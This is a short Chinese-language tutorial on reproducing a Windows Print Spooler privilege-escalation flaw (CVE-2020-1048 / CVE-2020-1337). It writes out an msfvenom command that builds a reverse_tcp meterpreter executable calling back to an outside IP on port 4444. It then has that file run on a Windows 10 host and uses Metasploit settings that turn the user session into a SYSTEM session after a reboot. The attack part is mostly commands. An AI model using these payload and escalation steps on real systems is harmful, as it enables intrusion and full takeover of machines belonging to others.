在Windows Print Spooler中存在一个未打补丁的漏洞，攻击者可利用该漏洞以提升系统权限从而运行恶意软件。此问题影响Windows 7、Windows 8.x、Windows 10以及Windows Server版本。它的漏洞库追踪号码为CVE-2020-1048和CVE-2020-1337，严重程度评级为 "重要"。
当我们获得了一个Windows 10主机的一般权限时，想要提升到system权限，就可以利用这个漏洞。今天就带大家复现一下这个漏洞。

漏洞复现

1、首先获取一个权限的msf-meterpreter会话
msf生成上线exe:
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=193.168.1.96 LPORT=4444 -f exe > r.exe
msf开启监听：

将生成的exe拖到win10机器上运行，此时得到的权限是一般用户权限。

搜索可用的提权脚本

使用local_exploit_suggester进行查询哪些exp可以用,发现cve-2020-1048可用

使用cve-2020-1048提权
参数设置
set session 1set payload windows/x64/meterpreter/reverse_tcpset disablepayloadhandler falseset wfsdelay 600set verbose true

运行exp后，目标机器会重启（也可以手动重启目标机器），我们耐心等待重启完成就能自动获取一个高权限的msf-meterpreter会话了。
